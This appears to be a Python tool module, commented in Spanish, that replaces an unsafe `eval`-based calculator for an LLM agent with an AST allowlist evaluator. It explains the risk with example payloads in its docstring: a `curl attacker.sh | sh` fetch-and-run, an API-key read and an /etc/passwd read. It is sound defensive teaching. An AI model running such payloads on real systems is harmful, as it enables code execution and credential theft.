"""La tool `calculate`, con un evaluador seguro.

El README del mini propone esto:

    def calculate(expression: str):
        return eval(expression)

Eso es **ejecución remota de código**. No es una exageración didáctica: el
string llega de un modelo, que lo generó a partir de texto escrito por un
usuario cualquiera, y `eval` lo corre en TU proceso, con TU usuario, TUS
variables de entorno y TU acceso a la red y a la base.

    eval("__import__('os').system('curl attacker.sh | sh')")
    eval("__import__('os').environ['ANTHROPIC_API_KEY']")
    eval("open('/etc/passwd').read()")

Las tres son expresiones de Python perfectamente válidas.

La regla general, que vale para cualquier tool y no sólo para esta:

    una tool nunca EJECUTA el input, lo INTERPRETA

Interpretar significa parsear a una estructura y recorrerla decidiendo, nodo
por nodo, qué se permite. Es más trabajo y es la diferencia entre una
calculadora y una shell remota.
"""

import ast
import operator
from typing import Annotated

from pydantic import Field

from app.tools.registry import registry

# Cota al tamaño del input. Antes de parsear: un parser también consume CPU, y
# una expresión de 10 MB es un ataque aunque después la rechaces.
MAX_EXPRESSION_LENGTH = 200

# Cota al exponente. `2 ** 10` es una cuenta; `2 ** 999999999` es un proceso
# comiéndose toda la RAM de la máquina mientras Python calcula un entero de
# cientos de megabytes. Los enteros de Python no tienen límite de tamaño, así
# que este techo lo tenés que poner vos.
MAX_POW_EXPONENT = 100

# ALLOWLIST, no blocklist. La diferencia no es de estilo, es de seguridad:
#
#   blocklist  "prohibo `import`, `open`, `__class__`..."  -> tenés que haber
#              pensado en TODO lo peligroso. Un solo olvido y estás expuesto, y
#              los bypasses de sandboxes de Python son un deporte.
#   allowlist  "permito estas siete operaciones"           -> todo lo demás se
#              rechaza por default, incluido lo que no se te ocurrió.
#
# Cuando el default es "no", los olvidos fallan cerrados.
_BINARY_OPS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.FloorDiv: operator.floordiv,
    ast.Mod: operator.mod,
}

_UNARY_OPS = {
    ast.UAdd: operator.pos,  # +5
    ast.USub: operator.neg,  # -5
}


@registry.tool
def calculate(
    expression: Annotated[
        str,
        Field(
            description=(
                "La expresión a evaluar, en sintaxis de Python. "
                "Ejemplos: '42 * 2', '(15 + 5) / 4', '2 ** 10'."
            )
        ),
    ],
) -> float:
    """Evalúa una expresión aritmética y devuelve el resultado numérico.

    Usala siempre que necesites hacer una cuenta, por simple que parezca: es
    exacta, mientras que calcular de memoria es propenso a errores.

    Soporta números, paréntesis y los operadores + - * / // % ** . No resuelve
    ecuaciones, ni álgebra simbólica, ni conversiones de unidades, ni funciones
    como raíz cuadrada o seno.
    """
    # Este docstring es el prompt que lee el modelo. La última frase —lo que NO
    # hace— es la mitad que más se olvida y la que evita que te llame para algo
    # que va a fallar.
    if len(expression) > MAX_EXPRESSION_LENGTH:
        raise ValueError(f"expresión demasiado larga (máximo {MAX_EXPRESSION_LENGTH})")

    try:
        # `mode="eval"` limita el parseo a UNA expresión. Con el default
        # (`mode="exec"`) el parser aceptaría sentencias: asignaciones,
        # `import`, `def`, un programa entero. Primera barrera, y gratis.
        #
        # Ojo con el nombre: `ast.parse(..., mode="eval")` NO ejecuta nada.
        # Sólo construye el árbol sintáctico. Lo peligroso es `eval()`, la
        # función built-in, que es otra cosa.
        tree = ast.parse(expression, mode="eval")
    except SyntaxError as exc:
        raise ValueError(f"expresión inválida: {expression!r}") from exc

    try:
        return _evaluate(tree.body)
    except ZeroDivisionError as exc:
        # Traducimos a ValueError para que arriba haya un solo tipo de error
        # esperable que contarle al modelo.
        raise ValueError("división por cero") from exc


def _evaluate(node: ast.AST) -> float:
    """Recorre el árbol permitiendo sólo nodos aritméticos.

    Es recursivo porque el árbol lo es: en `2 * (3 + 4)`, el nodo de la
    multiplicación tiene adentro el nodo de la suma.

    El `case _` final es el corazón de todo: cualquier nodo que no esté
    explícitamente permitido arriba —una llamada a función, un nombre, un
    atributo, un string, un import— cae ahí y se rechaza.
    """
    match node:
        # Un número literal. `bool` es subclase de `int` en Python, así que
        # `True + 1` pasaría; es inofensivo y no vale la pena el chequeo extra.
        case ast.Constant(value=int() | float() as value):
            return value

        # La potencia va ANTES del caso general de BinOp porque necesita su
        # propia guarda. El orden de los `case` importa: gana el primero que
        # matchea.
        case ast.BinOp(left=left, op=ast.Pow(), right=right):
            base = _evaluate(left)
            exponent = _evaluate(right)
            # Se evalúa el exponente primero y se chequea el VALOR, no el
            # literal: `2 ** (999 * 999)` tiene un exponente chico escrito y
            # gigante calculado.
            if abs(exponent) > MAX_POW_EXPONENT:
                raise ValueError(f"exponente demasiado grande (máximo {MAX_POW_EXPONENT})")
            return base**exponent

        case ast.BinOp(left=left, op=op, right=right) if type(op) in _BINARY_OPS:
            return _BINARY_OPS[type(op)](_evaluate(left), _evaluate(right))

        case ast.UnaryOp(op=op, operand=operand) if type(op) in _UNARY_OPS:
            return _UNARY_OPS[type(op)](_evaluate(operand))

        case _:
            # El mensaje nombra el tipo de nodo (`Call`, `Name`, `Attribute`)
            # porque lo lee el modelo: con eso entiende que le estás pidiendo
            # aritmética pura y reescribe la expresión.
            raise ValueError(
                f"operación no permitida en una expresión aritmética: "
                f"{type(node).__name__}"
            )
